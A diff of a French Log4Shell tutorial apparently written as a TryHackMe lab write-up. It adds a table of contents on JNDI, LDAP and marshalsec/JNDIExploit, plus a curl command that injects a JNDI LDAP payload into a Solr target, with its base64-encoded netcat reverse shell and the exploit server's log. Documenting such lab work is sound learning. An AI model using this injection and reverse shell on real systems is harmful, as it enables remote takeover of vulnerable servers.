@@ -1,3 +1,28 @@
+
+<h1>Introduction à Log4Shell</h1>
+
+- [JNDI](#jndi)
+- [LDAP](#ldap)
+  - [OpenLDAP](#openldap)
+  - [LDAP URL](#ldap-url)
+- [log4j2](#log4j2)
+- [suite, en LOCAL](#suite-en-local)
+  - [OpenLDAP java schema](#openldap-java-schema)
+  - [netcat](#netcat)
+  - [Sans netcat](#sans-netcat)
+  - [Exploit en local](#exploit-en-local)
+- [attaque d'une machine vulnérable sur tryhackme](#attaque-dune-machine-vulnérable-sur-tryhackme)
+  - [Echec !](#echec-)
+  - [Succès avec marshalsec](#succès-avec-marshalsec)
+    - [Préparation : marshalsec](#préparation--marshalsec)
+    - [Préparation : le payload .class](#préparation--le-payload-class)
+    - [Préparation : le listener ncat](#préparation--le-listener-ncat)
+    - [Exécution : appel à solr](#exécution--appel-à-solr)
+  - [Succès avec JNDIExploit](#succès-avec-jndiexploit)
+    - [Préparation : JNDIExploit](#préparation--jndiexploit)
+    - [Préparation : le listener ncat](#préparation--le-listener-ncat-1)
+    - [Exécution : appel à solr](#exécution--appel-à-solr-1)
+
 # JNDI
 
 [https://www.jmdoudoux.fr/java/dej/chap-jndi.htm](https://www.jmdoudoux.fr/java/dej/chap-jndi.htm)
@@ -408,3 +433,10 @@ Puis :
 curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:1389/Basic/Command/Base64/bmMgMTAuOS4yLjIzNiA5OTk5IC1lIC9iaW4vYmFzaA==\}'
 ```
 (`10.10.106.228` est l'IP de la machine cible)
+
+*note* : pour info, JNDIExploit retourne bien des payloads de classes Java sérialisées, quand on le requête avec une LDAP URL.
+```
+[+] Send LDAP reference result for Basic/Command/Base64/bmMgMTAuOS4yLjIzNiA5OTk5IC1lIC9iaW4vYmFzaA== redirecting to http://10.9.2.236:8888/ExploitXlJafSwxR8.class
+[+] New HTTP Request From /10.10.106.228:43946  /ExploitXlJafSwxR8.class
+[+] Receive ClassRequest: ExploitXlJafSwxR8.class
+```
